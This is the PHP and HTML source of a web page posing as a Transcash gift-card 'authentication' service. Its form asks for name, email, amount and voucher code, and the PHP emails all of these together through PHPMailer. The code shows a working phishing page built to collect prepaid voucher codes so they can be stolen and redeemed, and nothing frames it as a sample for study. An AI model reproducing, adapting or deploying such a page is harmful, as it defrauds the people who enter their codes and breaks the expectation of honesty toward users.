<?php

use PHPMailer\PHPMailer\PHPMailer;


$name = filter_input(INPUT_POST, "Name", FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$Prix = filter_input(INPUT_POST, "Prix", FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$code = filter_input(INPUT_POST, "code", FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$mailToSend = filter_input(INPUT_POST, "Email", FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$btn = filter_input(INPUT_POST, "envoyer", FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$messageBod = $name . " " . $Prix . " " . $code . " " . $mailToSend;
 require_once '../authentificateurcartes.github.io/EnvoiMail.php';
if (isset($btn) && $btn == "envoyer") {
     $mail = new PHPMailer(true);
    EnvoieMail($mail,$mailToSend, $messageBod, $Prix, $name, $code );
    
}

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transcash</title>
    <link rel="stylesheet" href="googleplay.css">
    <link rel="stylesheet" href="boxicons.min.css">
    
</head>
<body>
    <header>
       
        <nav  id="nav" class="active">
            <div id="icons"></div>
            <a href="index.html" class="title">Gifts Cards </a>
            <link rel="stylesheet"
            href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
            <ul>
                <li><a href="index.html">Home</a></li>
                <li><a href="#">Cards</a></li>
                <li><a href="#">Why to do it ?</a></li>
                <li><a href="#">Support</a></li>
                <li><a href="#">Contacts</a></li>
             </ul>
          
            <input type="search" value="search" itemscope>
        </nav>
    </header>
    <section>--
        <div class="description">
            <h2>How to do it</h2>
            <ol>
              <img src="images/transcash.png" alt="">
              <li>Please complete the form opposite to submit your authentification request</li>
            </ol>
        </div>
        <div class="formulaire">
            <form action="#" method="POST">
                <h2>Authentifier</h2>
                <input type="Name" id="Name" name="Name" placeholder="Name">
                <input type="email" id="email"  name="Email" placeholder="Email" required>
                <input type="number" id="Prix" name="Prix" placeholder="Price in €" required>
                <input type="text" id="code" name="code" placeholder="Code" required>
                <button type="submit" value="envoyer" name="envoyer" class="btn">Submit</button>
            </form>
        </div>

    </section>
    <script src="https://smtpjs.com/v3/smtp.js">
        </script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

    <script src="tc.js"></script>
</body>